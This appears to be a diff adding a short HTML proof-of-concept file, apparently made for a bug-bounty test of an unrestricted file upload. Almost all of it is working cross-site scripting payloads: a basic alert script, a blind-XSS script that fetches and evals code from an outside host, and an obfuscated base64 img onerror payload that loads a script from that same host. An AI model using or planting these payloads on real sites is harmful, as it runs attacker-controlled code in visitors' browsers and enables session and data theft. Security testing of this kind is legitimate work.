@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Mufeed VH POC</title>
+</head>
+<body>
+
+<p>POC - Unrestricted File Upload (RCE)</p>
+
+<!-- BASIC XSS -- >
+<script>alert(document.domain);</script>
+
+<!-- BLIND XSS -->
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//mvh2002.xss.ht");a.send();</script>
+
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbXZoMjAwMi54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+
+</body>
+</html>
+
